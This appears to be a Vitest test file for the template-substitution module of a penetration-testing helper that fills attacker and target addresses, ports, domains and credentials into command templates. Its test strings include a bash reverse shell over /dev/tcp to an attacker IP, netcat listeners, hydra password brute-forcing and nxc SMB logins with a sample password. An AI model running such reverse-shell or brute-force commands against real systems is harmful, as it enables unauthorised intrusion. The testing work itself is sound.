import { describe, it, expect } from 'vitest';
import { resolveTemplate, contextFromGlobalVars, SubstitutionContext } from './variableSubstitution';
import { GlobalVariables } from '../types';

const ctx: SubstitutionContext = {
  lhost: '10.10.14.2',
  lport: '9001',
  rhost: '10.10.10.50',
  activeTargetIp: undefined,
  shell: '/bin/bash',
  interface: 'tun0',
  customVars: { USER: 'admin', WORDLIST: '/usr/share/wordlists/rockyou.txt' },
};

describe('resolveTemplate - aliases', () => {
  it('resolves lowercase exact {ip} {port} {shell} (ReverseShellGenerator/revshellsData syntax)', () => {
    const r = resolveTemplate('{shell} -i >& /dev/tcp/{ip}/{port} 0>&1', ctx);
    expect(r.text).toBe('/bin/bash -i >& /dev/tcp/10.10.14.2/9001 0>&1');
    expect(r.unresolved).toEqual([]);
  });

  it('resolves {TARGET_IP}, {TARGET}, {IP} (case-insensitive) to the target', () => {
    expect(resolveTemplate('nmap {TARGET_IP}', ctx).text).toBe('nmap 10.10.10.50');
    expect(resolveTemplate('ping {TARGET}', ctx).text).toBe('ping 10.10.10.50');
    expect(resolveTemplate('curl {IP}', ctx).text).toBe('curl 10.10.10.50');
    expect(resolveTemplate('curl {Ip}', ctx).text).toBe('curl 10.10.10.50');
  });

  it('resolves {LHOST} and {LPORT} case-insensitively', () => {
    expect(resolveTemplate('nc {LHOST} {LPORT}', ctx).text).toBe('nc 10.10.14.2 9001');
    expect(resolveTemplate('nc {lhost} {lport}', ctx).text).toBe('nc 10.10.14.2 9001');
  });

  it('resolves {INTERFACE} case-insensitively', () => {
    expect(resolveTemplate('ip a show {INTERFACE}', ctx).text).toBe('ip a show tun0');
  });

  it('resolves Obsidian angle-bracket aliases <TARGET_IP> <LHOST> <LPORT> <INTERFACE> <Target-IP>', () => {
    const r = resolveTemplate('nc -lvnp <LPORT> on <INTERFACE> against <TARGET_IP> or <Target-IP>', ctx);
    expect(r.text).toBe('nc -lvnp 9001 on tun0 against 10.10.10.50 or 10.10.10.50');
    expect(resolveTemplate('<LHOST>', ctx).text).toBe('10.10.14.2');
  });

  it('resolves custom variables with curly and angle brackets, case-insensitively', () => {
    const r = resolveTemplate('hydra -l {USER} -P <WORDLIST> {TARGET_IP} ssh', ctx);
    expect(r.text).toBe('hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.50 ssh');
    expect(resolveTemplate('{user}', ctx).text).toBe('admin');
  });

  it('leaves unknown tokens (DOMAIN, USER without customVar, PORT) untouched and unresolved', () => {
    const noCustom: SubstitutionContext = { ...ctx, customVars: {} };
    const r = resolveTemplate('dig axfr @{TARGET_IP} {DOMAIN}', noCustom);
    expect(r.text).toBe('dig axfr @10.10.10.50 {DOMAIN}');
    expect(r.unresolved).toEqual(['DOMAIN']);
  });
});

describe('resolveTemplate - precedence', () => {
  it('prefers the active engaged target IP over the global RHOST', () => {
    const withActive: SubstitutionContext = { ...ctx, rhost: '10.10.10.50', activeTargetIp: '10.10.10.99' };
    expect(resolveTemplate('{TARGET_IP}', withActive).text).toBe('10.10.10.99');
  });

  it('falls back to the global RHOST when no target is actively engaged', () => {
    const noActive: SubstitutionContext = { ...ctx, rhost: '10.10.10.50', activeTargetIp: undefined };
    expect(resolveTemplate('{TARGET_IP}', noActive).text).toBe('10.10.10.50');
  });

  it('falls back to the global RHOST when activeTargetIp is an empty string', () => {
    const emptyActive: SubstitutionContext = { ...ctx, rhost: '10.10.10.50', activeTargetIp: '' };
    expect(resolveTemplate('{TARGET_IP}', emptyActive).text).toBe('10.10.10.50');
  });
});

describe('resolveTemplate - unresolved reporting', () => {
  it('reports LHOST unresolved when empty, still rendering a readable placeholder', () => {
    const empty: SubstitutionContext = { lhost: '', lport: '9001', rhost: '10.10.10.50', customVars: {} };
    const r = resolveTemplate('nc -lvnp {LPORT} and revshell to {LHOST}', empty);
    expect(r.unresolved).toEqual(['LHOST']);
    expect(r.text).toBe('nc -lvnp 9001 and revshell to 10.10.14.X');
  });

  it('reports unresolved for every known field when all context values are empty', () => {
    const empty: SubstitutionContext = { lhost: '', lport: '', rhost: '', shell: '', interface: '', customVars: {} };
    const r = resolveTemplate('{shell} {ip} {port} {TARGET_IP} {LHOST} {LPORT} {INTERFACE}', empty);
    expect(r.unresolved.sort()).toEqual(['INTERFACE', 'LHOST', 'LPORT', 'SHELL', 'TARGET_IP'].sort());
  });

  it('empty values count as unresolved even though a fallback placeholder is shown', () => {
    const empty: SubstitutionContext = { lhost: '', rhost: '10.10.10.5', customVars: {} };
    const r = resolveTemplate('{LHOST}', empty);
    expect(r.unresolved).toContain('LHOST');
    expect(r.text).not.toBe('{LHOST}'); // still a readable placeholder, not the raw token
  });

  it('returns empty result for an empty template', () => {
    expect(resolveTemplate('', ctx)).toEqual({ text: '', unresolved: [], ranges: [] });
  });
});

describe('resolveTemplate - no substitution inside other tools\' variable syntax', () => {
  it('does not substitute inside ${VAR} (bash/JS parameter expansion)', () => {
    const r = resolveTemplate('echo ${LPORT} and ${TARGET_IP}', ctx);
    expect(r.text).toBe('echo ${LPORT} and ${TARGET_IP}');
  });

  it('does not touch $(cmd) command substitution, even while resolving our own vars around it', () => {
    const r = resolveTemplate('nc {TARGET_IP} $(cat port.txt) -p {LPORT}', ctx);
    expect(r.text).toBe('nc 10.10.10.50 $(cat port.txt) -p 9001');
  });

  it('does not substitute inside %VAR% (Windows batch / PowerShell env syntax)', () => {
    const r = resolveTemplate('echo %LPORT%% and %TARGET_IP%', ctx);
    expect(r.text).toBe('echo %LPORT%% and %TARGET_IP%');
  });
});

describe('resolveTemplate - repeated variables', () => {
  it('resolves every occurrence of a repeated token identically', () => {
    const r = resolveTemplate('{LHOST} {LHOST} {LHOST}', ctx);
    expect(r.text).toBe('10.10.14.2 10.10.14.2 10.10.14.2');
    expect(r.ranges).toHaveLength(3);
    expect(r.ranges.every((rg) => rg.resolved)).toBe(true);
  });

  it('de-duplicates unresolved entries for repeated unresolved tokens', () => {
    const r = resolveTemplate('{DOMAIN}\\{USER}@{DOMAIN}', { ...ctx, customVars: {} });
    expect(r.unresolved.filter((u) => u === 'DOMAIN')).toHaveLength(1);
  });
});

describe('resolveTemplate - ranges', () => {
  it('reports character ranges referencing the original template text', () => {
    const template = 'ping {TARGET_IP}';
    const r = resolveTemplate(template, ctx);
    const rng = r.ranges[0];
    expect(template.slice(rng.start, rng.end)).toBe('{TARGET_IP}');
    expect(rng.canonical).toBe('rhost');
    expect(rng.resolved).toBe(true);
  });
});

describe('contextFromGlobalVars', () => {
  it('maps GlobalVariables onto the canonical context and applies the active-target precedence', () => {
    const globalVars: GlobalVariables = {
      lhost: '10.10.14.2',
      lport: '9001',
      targetIp: '10.10.10.50',
      interface: 'tun0',
      customVars: { USER: 'admin' },
    };
    const built = contextFromGlobalVars(globalVars, { activeTargetIp: '10.10.10.99', shell: '/bin/sh' });
    expect(resolveTemplate('{TARGET_IP}', built).text).toBe('10.10.10.99');
    expect(resolveTemplate('{shell}', built).text).toBe('/bin/sh');

    const withoutActive = contextFromGlobalVars(globalVars);
    expect(resolveTemplate('{TARGET_IP}', withoutActive).text).toBe('10.10.10.50');
  });
});

describe('resolveTemplate - lab/AD global aliases', () => {
  const vars: GlobalVariables = {
    lhost: '10.10.14.2',
    lport: '9001',
    targetIp: '10.10.10.50',
    interface: 'tun0',
    domain: 'corp.htb',
    dcIp: '10.10.10.1',
    user: 'svc_sql',
    cred: 'Winter2026!',
    wordlist: '/usr/share/seclists/top.txt',
    customVars: { DOMAIN: 'fallback.local', USER: 'fallbackuser' },
  };

  it('maps DOMAIN, DC_IP, USER, CRED, WORDLIST from globalVars (both brace styles, any case)', () => {
    const r = resolveTemplate(
      'nxc smb {DC_IP} -d {DOMAIN} -u <USER> -p {cred} && hydra -P {WORDLIST} {DC-IP}',
      contextFromGlobalVars(vars)
    );
    expect(r.text).toBe('nxc smb 10.10.10.1 -d corp.htb -u svc_sql -p Winter2026! && hydra -P /usr/share/seclists/top.txt 10.10.10.1');
    expect(r.unresolved).toEqual([]);
  });

  it('falls back to a same-named custom variable when the global is empty', () => {
    const r = resolveTemplate('{DOMAIN}/{USER}', contextFromGlobalVars({ ...vars, domain: '', user: undefined }));
    expect(r.text).toBe('fallback.local/fallbackuser');
    expect(r.unresolved).toEqual([]);
  });

  it('reports an empty global without fallback as unresolved and leaves the token', () => {
    const r = resolveTemplate('dig @{DC_IP} {DOMAIN}', contextFromGlobalVars({ ...vars, dcIp: '', domain: '', customVars: {} }));
    expect(r.text).toBe('dig @{DC_IP} {DOMAIN}');
    expect(r.unresolved).toEqual(['DC_IP', 'DOMAIN']);
  });

  it('leaves the legacy LHOST/LPORT/TARGET_IP/RHOST/{ip} behavior unchanged', () => {
    const c = contextFromGlobalVars(vars);
    expect(resolveTemplate('{ip}:{port} {TARGET_IP} {LHOST}:{LPORT}', c).text).toBe('10.10.14.2:9001 10.10.10.50 10.10.14.2:9001');
    expect(resolveTemplate('{ip} {DOMAIN}', c, { legacyAliases: true }).text).toBe('10.10.10.50 corp.htb');
  });
});
